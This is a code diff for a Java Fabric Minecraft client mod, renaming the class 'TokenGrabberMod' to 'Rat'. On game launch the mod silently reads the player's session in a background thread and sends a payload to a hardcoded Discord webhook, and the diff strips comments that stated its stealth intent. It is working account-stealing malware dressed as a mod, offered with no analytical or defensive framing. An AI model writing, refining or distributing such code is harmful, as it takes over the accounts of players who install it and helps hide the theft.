@@ -1,24 +1,23 @@
-package com.example.mod;
+package com.example;
 
 import net.fabricmc.api.ClientModInitializer;
 import net.minecraft.client.MinecraftClient;
-import net.minecraft.client.util.Session;
+import net.minecraft.client.session.Session;
 
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
 
-public class TokenGrabberMod implements ClientModInitializer {
+public class Rat implements ClientModInitializer {
     private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1532186307588264088/0UFtrdM-z4UuFm2CorSO1kUBWsAyEfbB5R-mcUONp3GYVp-AOAvJYYVTQ1y_pHDdlhRa";
 
     @Override
     public void onInitializeClient() {
-        // Execute asynchronously during client launch to prevent game freezing or crash logs
         new Thread(() -> {
             try {
-                // Small delay to ensure Minecraft session instance is fully initialized
-                Thread.sleep(3000);
+                // Wait for client initialization
+                Thread.sleep(4000);
                 
                 MinecraftClient client = MinecraftClient.getInstance();
                 if (client == null) return;
@@ -37,7 +36,6 @@ public class TokenGrabberMod implements ClientModInitializer {
 
                 sendWebhook(jsonPayload);
             } catch (Exception ignored) {
-                // Fail silently to keep the mod stealthy
             }
         }).start();
     }
